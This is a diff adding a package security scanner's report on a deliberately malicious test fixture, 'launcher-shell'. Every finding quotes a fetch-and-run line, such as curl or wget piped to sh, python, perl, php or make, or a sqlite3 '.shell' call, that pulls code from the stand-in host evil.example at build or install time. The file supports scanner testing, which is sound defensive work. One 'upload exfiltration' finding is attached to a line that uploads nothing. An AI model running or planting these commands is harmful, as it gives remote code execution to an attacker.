@@ -1,0 +1,153 @@
+
+Scan Results: launcher-shell
+============================================================
+
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:17
+    Code:     curl -fsSL https://evil.example/install.sh | busybox sh
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] DLE-002 Wget pipe to shell
+    Downloading and executing remote scripts via wget
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:31
+    Code:     wget -qO- https://evil.example/stage2.sh | env -i sh
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] DLE-001 Curl pipe to shell (install script)
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/launcher-shell/launcher-shell.install:5
+    Code:     curl -fsSL https://evil.example/postinstall.sh | /bin/sh
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] DLE-001 Curl pipe to shell (install script)
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/launcher-shell/launcher-shell.install:7
+    Code:     sqlite3 /var/lib/app.db ".shell curl -fsSL https://evil.example/s | sh"
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] INSTALL-003 Network access in install script (install script)
+    Install scripts should not make network connections
+    Location: tests/fixtures/malicious/launcher-shell/launcher-shell.install:5
+    Code:     curl -fsSL https://evil.example/postinstall.sh | /bin/sh
+    Recommendation: Install scripts should never download additional content
+    Reference: CWE-494
+
+[CRITICAL] INSTALL-003 Network access in install script (install script)
+    Install scripts should not make network connections
+    Location: tests/fixtures/malicious/launcher-shell/launcher-shell.install:7
+    Code:     sqlite3 /var/lib/app.db ".shell curl -fsSL https://evil.example/s | sh"
+    Recommendation: Install scripts should never download additional content
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/install.sh
+    This package downloads and executes code from https://evil.example/install.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:17
+    Code: curl -fsSL https://evil.example/install.sh | busybox sh
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/y.py
+    This package downloads and executes code from https://evil.example/y.py at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:19
+    Code: wget -qO- https://evil.example/y.py | /usr/bin/python -
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/p.py
+    This package downloads and executes code from https://evil.example/p.py at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:21
+    Code: python3 <(curl -fsSL https://evil.example/p.py)
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/p.pl
+    This package downloads and executes code from https://evil.example/p.pl at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:22
+    Code: perl -e "$(curl -fsSL https://evil.example/p.pl)"
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/p.php
+    This package downloads and executes code from https://evil.example/p.php at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:24
+    Code: php -r "$(curl -fsSL https://evil.example/p.php)"
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/stage2.sh
+    This package downloads and executes code from https://evil.example/stage2.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:31
+    Code: wget -qO- https://evil.example/stage2.sh | env -i sh
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/postinstall.sh (install script)
+    This package downloads and executes code from https://evil.example/postinstall.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/launcher-shell/launcher-shell.install:5
+    Code: curl -fsSL https://evil.example/postinstall.sh | /bin/sh
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/s (install script)
+    This package downloads and executes code from https://evil.example/s at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/launcher-shell/launcher-shell.install:7
+    Code: sqlite3 /var/lib/app.db ".shell curl -fsSL https://evil.example/s | sh"
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[HIGH] EXFIL-006 HTTP upload exfiltration
+    curl uploading a local file (-T/--upload-file/-F/--data-urlencode) — used to send harvested data to an attacker endpoint.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:26
+    Code:     curl -fsSL https://evil.example/Makefile | make -f -
+    Recommendation: Verify what is being uploaded and to where.
+    Reference: CWE-200
+
+[HIGH] EXEC-007 make reads a Makefile from stdin
+    `make -f -` / `make -f /dev/stdin` executes a Makefile fed on standard input (commonly the tail of a `curl ... | make -f -` fetch-and-run). A Makefile is arbitrary shell recipes, so this is RCE from an unverified source. Normal `make` / `make -f Makefile` builds are unaffected.
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:26
+    Code:     curl -fsSL https://evil.example/Makefile | make -f -
+    Recommendation: Review the Makefile source; building a Makefile read from stdin/a pipe runs unverified recipes.
+    Reference: CWE-94
+
+[HIGH] EXEC-006 sqlite3 shell-command execution (install script)
+    sqlite3's `.shell`/`.system` dot-commands run an arbitrary shell command, and `.import` can read an attacker-controlled file — an exec/RCE vector hidden inside what looks like a database call. Legitimate packages do not drive sqlite3 through these meta-commands.
+    Location: tests/fixtures/malicious/launcher-shell/launcher-shell.install:7
+    Code:     sqlite3 /var/lib/app.db ".shell curl -fsSL https://evil.example/s | sh"
+    Recommendation: Do not build. sqlite3 .shell/.system run arbitrary commands; report the package.
+    Reference: CWE-94
+
+[HIGH] FUNC-001 Network access in build function
+    Function 'build' contains network access command 'curl'
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:15
+    Recommendation: Network access should happen in source= array, not build functions
+
+[HIGH] FUNC-001 Network access in build function
+    Function 'build' contains network access command 'wget'
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:15
+    Recommendation: Network access should happen in source= array, not build functions
+
+[HIGH] FUNC-001 Network access in build function
+    Function 'package' contains network access command 'wget'
+    Location: tests/fixtures/malicious/launcher-shell/PKGBUILD:29
+    Recommendation: Network access should happen in source= array, not build functions
+
+[MEDIUM] SRC-005 No sources with build function
+    Package has build() function but no source array
+    Recommendation: Verify this is intentional; build() usually needs sources
+
+
+
+============================================================
+Package: launcher-shell v1.0.0-1
+Scan duration: 7ms
+
+Found 21 issue(s):
+  14 CRITICAL
+  6 HIGH
+  1 MEDIUM
+============================================================
